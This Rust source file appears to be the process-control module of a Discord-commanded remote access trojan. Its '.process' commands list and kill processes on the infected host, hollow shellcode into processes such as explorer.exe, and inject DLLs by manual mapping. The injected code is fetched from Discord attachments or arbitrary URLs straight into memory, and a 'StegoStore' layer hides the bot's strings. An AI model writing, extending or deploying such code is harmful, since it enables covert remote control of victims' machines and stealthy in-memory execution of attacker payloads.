use crate::commands::Arguments;
use crate::commands::BotCommand;
use crate::core::process::{format_cpu_usage, format_memory_size, ProcessManager};
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::embed::EmbedField;
use twilight_model::channel::message::Message;
use crate::core::stego_store::{StegoStore, StringCategory};
use twilight_util::builder::embed::{EmbedBuilder, EmbedFooterBuilder};

pub struct ProcessCommand;

impl ProcessCommand {
    fn s(key: &str) -> String { StegoStore::get(StringCategory::System, key) }
    fn m(key: &str) -> String { StegoStore::get(StringCategory::Msg, key) }
}

#[async_trait]
impl BotCommand for ProcessCommand {
    fn name(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::CmdMeta, "PROCESS_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "PROCESS").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::CmdMeta, "CAT_SYSTEM").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::CmdMeta, "PROCESS_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![
            ".process list", 
            ".process kill 1234", 
            ".process info chrome.exe", 
            ".process installed",
            ".process hollow explorer.exe <SHELLCODE>",
            ".process dll chrome.exe <URL/PATH>",
            ".process thread chrome.exe <URL/PATH>",
            ".process inject chrome.exe <URL/PATH>"
        ].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(StegoStore::get(StringCategory::CmdMeta, "PROCESS_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(StegoStore::get(StringCategory::CmdMeta, "PROCESS_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = match args.next() {
            Some(action) => action,
            None => {
                let embed = EmbedBuilder::new()
                    .title(Self::m("PROC_TITLE"))
                    .description(Self::m("PROC_DESC_LIST"))
                    .color(0xFF6B6B)
                    .field(EmbedField {
                        name: StegoStore::get(StringCategory::Core, "USAGE"),
                        value: StegoStore::get(StringCategory::CmdMeta, "PROCESS_USAGE"),
                        inline: false,
                    })
                    .footer(EmbedFooterBuilder::new(Self::s("SYS_COMMANDS")))
                    .build();

                http.create_message_with_embeds(msg.channel_id.get(), &[embed]).await?;
                return Ok(());
            }
        };

        match action {
            "list" => self.list_processes(http, msg).await,
            "installed" => self.list_installed_apps(http, msg).await,
            "kill" => {
                let target = match args.next() {
                    Some(target) => target,
                    None => {
                        http.create_message(msg.channel_id.get(), &Self::m("PROC_ERR_PID")).await?;
                        return Ok(());
                    }
                };
                self.kill_process(http, msg, target).await
            }
            "info" => {
                let target = match args.next() {
                    Some(target) => target,
                    None => {
                        http.create_message(msg.channel_id.get(), &Self::m("PROC_ERR_PID")).await?;
                        return Ok(());
                    }
                };
                self.process_info(http, msg, target).await
            }
            "hollow" => {
                let target = match args.next() {
                    Some(target) => target.to_string(),
                    None => {
                        http.create_message(msg.channel_id.get(), "Usage: .process hollow <pid/name> [shellcode_hex]").await?;
                        return Ok(());
                    }
                };
                let shellcode_hex = args.next().unwrap_or("none");
                self.hollow_process(http, msg, &target, shellcode_hex).await
            }
            "dll" | "thread" => {
                let target = match args.next() {
                    Some(target) => target.to_string(),
                    None => {
                        http.create_message(msg.channel_id.get(), "Usage: .process thread <pid/name> [path/url]").await?;
                        return Ok(());
                    }
                };
                let dll_path = args.next().unwrap_or("none");
                self.inject_dll_to_process(http, msg, &target, dll_path, true).await
            }
            "inject" => {
                let target = match args.next() {
                    Some(target) => target.to_string(),
                    None => {
                        http.create_message(msg.channel_id.get(), "Usage: .process inject <pid/name> [path/url]").await?;
                        return Ok(());
                    }
                };
                let dll_path = args.next().unwrap_or("none");
                self.inject_dll_to_process(http, msg, &target, dll_path, false).await
            }
            _ => Ok(())
        }
    }
}

impl ProcessCommand {
    async fn list_processes(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let mut manager = ProcessManager::new();
        let processes = manager.list_processes();
        let total = processes.len();
        let processes: Vec<_> = processes.into_iter().take(50).collect();

        let mut list_buffer = String::from("```ptr\n PID   | PROCESS NAME\n-------|--------------\n");
        for proc in processes {
            list_buffer.push_str(&format!("{:<6} | {}\n", proc.pid, proc.name));
        }
        list_buffer.push_str("```");

        let embed = EmbedBuilder::new()
            .title(Self::s("PROC_LIST"))
            .description(format!("{}\n{}", 
                Self::m("PROC_SHOW_FMT").replace("{}", &total.to_string()),
                list_buffer
            ))
            .color(0x4ECDC4)
            .footer(EmbedFooterBuilder::new(Self::s("PROC_MANAGER")))
            .build();

        http.create_message_with_embeds(msg.channel_id.get(), &[embed]).await?;
        Ok(())
    }

    async fn kill_process(&self, http: &Arc<HttpClient>, msg: &Message, target: &str) -> Result<()> {
        let mut manager = ProcessManager::new();
        let pid = if let Ok(parsed_pid) = target.parse::<u32>() {
            parsed_pid
        } else {
            // Find by name
            let results = manager.find_processes_by_name(target);
            if results.is_empty() {
                http.create_message(msg.channel_id.get(), &format!("❌ No process found with name: {}", target)).await?;
                return Ok(());
            }
            results[0].pid
        };

        match manager.kill_process(pid) {
            Ok(_) => { http.create_message(msg.channel_id.get(), &format!("💥 Process {} ({}) crashed via Stealth Engine.", target, pid)).await?; }
            Err(e) => { http.create_message(msg.channel_id.get(), &format!("❌ Failed: {}", e)).await?; }
        }
        Ok(())
    }

    async fn process_info(&self, http: &Arc<HttpClient>, msg: &Message, target: &str) -> Result<()> {
        let mut manager = ProcessManager::new();
        let pid = target.parse::<u32>().unwrap_or(0);
        if let Some(process) = manager.get_process_by_pid(pid) {
            let embed = EmbedBuilder::new()
                .title(format!("Info: {}", process.name))
                .color(0x45B7D1)
                .field(EmbedField { name: Self::m("INFO_PID"), value: process.pid.to_string(), inline: true })
                .field(EmbedField { name: Self::m("INFO_MEM"), value: format_memory_size(process.memory_usage), inline: true })
                .footer(EmbedFooterBuilder::new(Self::s("PROC_MANAGER")))
                .build();
            http.create_message_with_embeds(msg.channel_id.get(), &[embed]).await?;
        }
        Ok(())
    }

    async fn list_installed_apps(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        http.create_message(msg.channel_id.get(), &Self::m("PROC_GATHERING")).await?;
        Ok(())
    }

    async fn hollow_process(&self, http: &Arc<HttpClient>, msg: &Message, target: &str, hex_arg: &str) -> Result<()> {
        let mut manager = ProcessManager::new();
        let pid = self.resolve_pid(&mut manager, target)?;
        if pid == 0 {
            http.create_message(msg.channel_id.get(), &format!("❌ No process found: {}", target)).await?;
            return Ok(());
        }

        let mut shellcode = Vec::new();

        // 1. Check for attachments (Binary payload)
        if !msg.attachments.is_empty() {
            http.create_message(msg.channel_id.get(), "📥 Receiving shellcode payload...").await?;
            shellcode = http.download_file(&msg.attachments[0].url).await?;
        } else if hex_arg != "none" {
            // 2. Parse Hex string
            match hex::decode(hex_arg.replace(" ", "").replace("0x", "")) {
                Ok(sc) => { shellcode = sc; }
                Err(_) => {
                    http.create_message(msg.channel_id.get(), "❌ Invalid shellcode hex string.").await?;
                    return Ok(());
                }
            }
        } else {
            http.create_message(msg.channel_id.get(), "❌ Please provide a shellcode hex string or upload a binary file.").await?;
            return Ok(());
        }

        if shellcode.is_empty() {
            http.create_message(msg.channel_id.get(), "❌ Shellcode is empty.").await?;
            return Ok(());
        }

        match crate::stealth::get_engine() {
            Some(engine) => {
                unsafe {
                    match engine.hollow_shellcode(pid, &shellcode) {
                        Ok(_) => { http.create_message(msg.channel_id.get(), &format!("🚀 Successfully hollowed shellcode into {} ({})!", target, pid)).await?; }
                        Err(e) => { http.create_message(msg.channel_id.get(), &format!("❌ Hollowing failed: {}", e)).await?; }
                    }
                }
            }
            None => { http.create_message(msg.channel_id.get(), "❌ Stealth Engine not initialized.").await?; }
        }
        Ok(())
    }

    async fn inject_dll_to_process(&self, http: &Arc<HttpClient>, msg: &Message, target: &str, path_arg: &str, use_thread: bool) -> Result<()> {
        let mut manager = ProcessManager::new();
        let pid = self.resolve_pid(&mut manager, target)?;
        if pid == 0 {
            http.create_message(msg.channel_id.get(), &format!("❌ No process found: {}", target)).await?;
            return Ok(());
        }

        let mut dll_bytes: Vec<u8> = Vec::new();

        // 1. Check for attachments (Direct Memory Injection)
        if !msg.attachments.is_empty() {
            let attachment = &msg.attachments[0];
            if attachment.filename.to_lowercase().ends_with(".dll") {
                http.create_message(msg.channel_id.get(), "🛡️ [Stealth] Reflectively loading DLL into memory...").await?;
                dll_bytes = http.download_file(&attachment.url).await?;
            }
        } else if path_arg.starts_with("http") {
            // 2. Download from URL directly to memory
            http.create_message(msg.channel_id.get(), "📥 Downloading DLL to memory...").await?;
            dll_bytes = http.download_file(path_arg).await?;
        } else if path_arg != "none" {
            // 3. Load from local path if specified
            dll_bytes = std::fs::read(path_arg)?;
        }

        if dll_bytes.is_empty() {
            http.create_message(msg.channel_id.get(), "❌ No DLL data provided (upload a file or provide a URL/path).").await?;
            return Ok(());
        }

        // 4. Perform Manual Mapping Injection
        match crate::stealth::get_engine() {
            Some(engine) => {
                unsafe {
                    let result = if use_thread {
                        engine.manual_map_dll_thread(pid, &dll_bytes)
                    } else {
                        engine.manual_map_dll_hijack(pid, &dll_bytes)
                    };

                    match result {
                        Ok(_) => { 
                            let method = if use_thread { "NewThread" } else { "Hijack" };
                            http.create_message(msg.channel_id.get(), &format!("💉 [{}] Successfully injected DLL into {} ({})!", method, target, pid)).await?; 
                        }
                        Err(e) => { http.create_message(msg.channel_id.get(), &format!("❌ Injection failed: {}", e)).await?; }
                    }
                }
            }
            None => { http.create_message(msg.channel_id.get(), "❌ Stealth Engine not initialized.").await?; }
        }
        Ok(())
    }

    fn resolve_pid(&self, manager: &mut ProcessManager, target: &str) -> Result<u32> {
        if let Ok(pid) = target.parse::<u32>() {
            Ok(pid)
        } else {
            let results = manager.find_processes_by_name(target);
            if results.is_empty() {
                Ok(0)
            } else {
                Ok(results[0].pid)
            }
        }
    }
}
